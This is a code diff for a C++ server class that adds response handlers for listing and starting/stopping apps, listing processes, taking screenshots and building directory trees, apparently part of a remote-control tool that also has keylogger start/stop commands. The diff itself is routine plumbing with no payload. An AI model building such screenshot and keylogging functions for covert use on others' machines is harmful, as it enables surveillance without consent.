@@ -230,32 +230,64 @@ void Server::start()
 
 Response Server::listApp()
 {
+    std::string buffer;
+    uint32_t errCode;
+    if (listAppHelper(buffer) == -1)
+    {
+        buffer.clear();
+        errCode = FAIL_CODE;
+    }
+    else errCode = OK_CODE;
 
+    return Response(CMD_RESPONSE, errCode, buffer.size(), (void *)buffer.c_str());
 }
 Response Server::startApp(const char *appName)
 {
+    uint32_t errCode;
+    if (startAppHelper(appName) == -1)
+    {
+        errCode = FAIL_CODE;
+    }
+    else errCode = OK_CODE;
 
+    return Response(CMD_RESPONSE, errCode, 0, NULL);
 }
 Response Server::stopApp(const char *appName)
 {
+    uint32_t errCode;
+    if (stopAppHelper(appName) == -1)
+    {
+        errCode = FAIL_CODE;
+    }
+    else errCode = OK_CODE;
 
+    return Response(CMD_RESPONSE, errCode, 0, NULL);
 }
 
 Response Server::listProcesss()
 {
-    std::string res;
-    int status = listProcessesStr(res);
-    uint8_t errCode;
+    std::string buffer;
+    int status = listProcessesStrHelper(buffer);
+    uint32_t errCode;
     if (status == -1)
+    {
         errCode = FAIL_CODE;
+        buffer.clear();
+    }
     else errCode = OK_CODE;
 
-    return Response(CMD_RESPONSE, errCode, res.size(), (void *)res.c_str());
+    return Response(CMD_RESPONSE, errCode, buffer.size(), (void *)buffer.c_str());
 }
 
 Response Server::screenshot()
 {
+    std::vector<char> buffer;
+    uint32_t errCode;
+    if (screenshotHelper(buffer))
+        errCode = FAIL_CODE;
+    else errCode = OK_CODE;
 
+    return Response(CMD_RESPONSE, errCode, buffer.size(), buffer.data());
 }
 
 Response Server::startKeylog()
@@ -269,5 +301,15 @@ Response Server::stopKeylog()
 
 Response Server::dirTree(const char *pathName)
 {
-    
+    std::string buffer;
+    int status = listDirTreeHelper(pathName, buffer);
+    uint32_t errCode;
+    if (status == -1)
+    {
+        errCode = FAIL_CODE;
+        buffer.clear();
+    }
+    else errCode = OK_CODE;
+
+    return Response(CMD_RESPONSE, errCode, buffer.size(), (void *)buffer.c_str());
 }
